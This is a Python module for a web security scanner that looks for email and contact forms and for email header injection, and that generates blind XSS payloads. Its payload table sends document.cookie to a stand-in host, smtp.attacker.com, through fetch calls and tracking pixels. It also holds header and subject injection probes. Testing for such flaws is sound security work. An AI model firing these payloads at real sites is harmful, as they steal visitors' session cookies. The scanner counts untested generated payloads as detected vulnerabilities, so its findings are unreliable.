"""
SMTP Blind XSS Detection Module.

Detects and exploits XSS via email/Smtp channels:
- Email-based XSS payloads
- Email header injection
- SMTP callback exploitation
- Blind XSS via email forms
"""

import re
from typing import Dict, List
from dataclasses import dataclass
from enum import Enum


class SMTPExfiltrationMethod(Enum):
    """SMTP exfiltration methods."""
    EMAIL_BODY = "email_body"
    EMAIL_HEADER = "email_header"
    EMAIL_SUBJECT = "email_subject"
    ATTACHMENT = "attachment"
    TRACKING_PIXEL = "tracking_pixel"


@dataclass
class SMTPXSSVulnerability:
    """SMTP-based XSS vulnerability."""
    method: SMTPExfiltrationMethod
    payload: str
    callback_email: str
    severity: str
    context: str


class SMTPBlindXSSDetector:
    """
    Advanced SMTP blind XSS detector.
    Detects XSS vulnerabilities via email injection and SMTP callbacks.
    """

    # SMTP exfiltration payload templates
    SMTP_PAYLOADS = {
        SMTPExfiltrationMethod.EMAIL_BODY: [
            "<script>document.body.innerHTML='<img src=x onerror=\"fetch(\\\"https://smtp.attacker.com/?c=\\\"+btoa(document.cookie))\\\">'</script>",
            "<img src=x onerror=\"fetch('https://smtp.attacker.com/?c='+btoa(document.cookie))\">",
            "<svg onload=\"fetch('https://smtp.attacker.com/?c='+btoa(document.cookie))\">",
        ],
        SMTPExfiltrationMethod.EMAIL_HEADER: [
            "X-Injected: <script>alert(1)</script>",
            "X-Custom: <img src=x onerror=alert(1)>",
            "Reply-To: <script>alert(1)</script>@attacker.com",
        ],
        SMTPExfiltrationMethod.EMAIL_SUBJECT: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "{{7*7}}",  # Template injection probe
        ],
        SMTPExfiltrationMethod.ATTACHMENT: [
            "attachment; filename=\"<script>alert(1)</script>\"",
            "Content-Disposition: attachment; filename=\"<img src=x onerror=alert(1)>\"",
        ],
        SMTPExfiltrationMethod.TRACKING_PIXEL: [
            "<img src=\"https://track.attacker.com/pixel.gif?c='+btoa(document.cookie)+'\">",
            "<img src=\"https://smtp.attacker.com/track?c='+encodeURIComponent(document.cookie)+'\">",
        ],
    }

    # Email injection patterns
    EMAIL_INJECTION_PATTERNS = [
        r'\r\n.*(?:To|Cc|Bcc|Subject|From|Reply-To)\s*:',
        r'\n.*(?:To|Cc|Bcc|Subject|From|Reply-To)\s*:',
        r'Content-Type\s*:',
        r'MIME-Version\s*:',
        r'boundary\s*=',
    ]

    # Email form detection patterns
    EMAIL_FORM_PATTERNS = [
        r'<form[^>]*(?:contact|email|mail|message|feedback|support)[^>]*>',
        r'<input[^>]*(?:email|mail|message|contact|feedback)[^>]*>',
        r'type\s*=\s*["\']email["\']',
        r'name\s*=\s*["\'](?:email|mail|message|contact)["\']',
    ]

    def __init__(self):
        self._vulnerabilities: List[SMTPXSSVulnerability] = []

    def detect_email_forms(self, html_content: str) -> List[str]:
        """
        Detect email/contact forms in HTML.

        Args:
            html_content: HTML source code

        Returns:
            List of detected form indicators
        """
        forms = []
        for pattern in self.EMAIL_FORM_PATTERNS:
            matches = re.finditer(pattern, html_content, re.IGNORECASE)
            for match in matches:
                forms.append(match.group(0))
        return forms

    def check_email_header_injection(self, js_content: str, html_content: str = "") -> List[SMTPXSSVulnerability]:
        """
        Check for email header injection vulnerabilities.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        combined = js_content + "\n" + html_content
        lines = combined.split('\n')

        for line_num, line in enumerate(lines, 1):
            for pattern in self.EMAIL_INJECTION_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    vulnerabilities.append(SMTPXSSVulnerability(
                        method=SMTPExfiltrationMethod.EMAIL_HEADER,
                        payload=line.strip(),
                        callback_email="detected",
                        severity="high",
                        context=f"Line {line_num}: Potential email header injection"
                    ))
                    break

        return vulnerabilities

    def generate_smtp_payloads(
        self,
        callback_email: str,
        method: SMTPExfiltrationMethod = SMTPExfiltrationMethod.EMAIL_BODY,
        marker: str = "xoxss"
    ) -> List[str]:
        """
        Generate SMTP exfiltration payloads.

        Args:
            callback_email: Email address for callbacks
            method: Exfiltration method
            marker: Unique marker

        Returns:
            List of payload strings
        """
        templates = self.SMTP_PAYLOADS.get(method, [])
        payloads = []

        for template in templates:
            payload = template.replace("attacker.com", callback_email.split("@")[1] if "@" in callback_email else callback_email)
            payload = payload.replace("alert(1)", f"alert('{marker}')")
            payloads.append(payload)

        return payloads

    def scan_for_smtp_xss(
        self,
        html_content: str,
        js_content: str = "",
        callback_email: str = "callback@attacker.com",
        marker: str = "xoxss"
    ) -> List[SMTPXSSVulnerability]:
        """
        Scan for SMTP-based XSS vulnerabilities.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            callback_email: Email address for callbacks
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []

        # Detect email forms
        forms = self.detect_email_forms(html_content)
        if forms:
            # Generate payloads for email body injection
            payloads = self.generate_smtp_payloads(callback_email, SMTPExfiltrationMethod.EMAIL_BODY, marker)
            for payload in payloads:
                vuln = SMTPXSSVulnerability(
                    method=SMTPExfiltrationMethod.EMAIL_BODY,
                    payload=payload,
                    callback_email=callback_email,
                    severity="high",
                    context="Email form detected - body injection possible"
                )
                self._vulnerabilities.append(vuln)

        # Check for header injection
        header_vulns = self.check_email_header_injection(js_content, html_content)
        self._vulnerabilities.extend(header_vulns)

        # Generate header injection payloads
        header_payloads = self.generate_smtp_payloads(callback_email, SMTPExfiltrationMethod.EMAIL_HEADER, marker)
        for payload in header_payloads:
            vuln = SMTPXSSVulnerability(
                method=SMTPExfiltrationMethod.EMAIL_HEADER,
                payload=payload,
                callback_email=callback_email,
                severity="high",
                context="Generated email header injection payload"
            )
            self._vulnerabilities.append(vuln)

        # Generate subject injection payloads
        subject_payloads = self.generate_smtp_payloads(callback_email, SMTPExfiltrationMethod.EMAIL_SUBJECT, marker)
        for payload in subject_payloads:
            vuln = SMTPXSSVulnerability(
                method=SMTPExfiltrationMethod.EMAIL_SUBJECT,
                payload=payload,
                callback_email=callback_email,
                severity="medium",
                context="Generated email subject injection payload"
            )
            self._vulnerabilities.append(vuln)

        return self._vulnerabilities

    def assess_smtp_risk(self, vulnerabilities: List[SMTPXSSVulnerability]) -> str:
        """Assess overall SMTP XSS risk."""
        if not vulnerabilities:
            return "none"

        high_severity = [v for v in vulnerabilities if v.severity == "high"]
        if high_severity:
            return "critical"

        return "high"

    def get_smtp_summary(self) -> Dict[str, int]:
        """Get summary of SMTP findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_method": {
                "email_body": sum(1 for v in self._vulnerabilities if v.method == SMTPExfiltrationMethod.EMAIL_BODY),
                "email_header": sum(1 for v in self._vulnerabilities if v.method == SMTPExfiltrationMethod.EMAIL_HEADER),
                "email_subject": sum(1 for v in self._vulnerabilities if v.method == SMTPExfiltrationMethod.EMAIL_SUBJECT),
                "attachment": sum(1 for v in self._vulnerabilities if v.method == SMTPExfiltrationMethod.ATTACHMENT),
                "tracking_pixel": sum(1 for v in self._vulnerabilities if v.method == SMTPExfiltrationMethod.TRACKING_PIXEL),
            },
        }
        return summary


__all__ = [
    "SMTPBlindXSSDetector",
    "SMTPExfiltrationMethod",
    "SMTPXSSVulnerability",
]
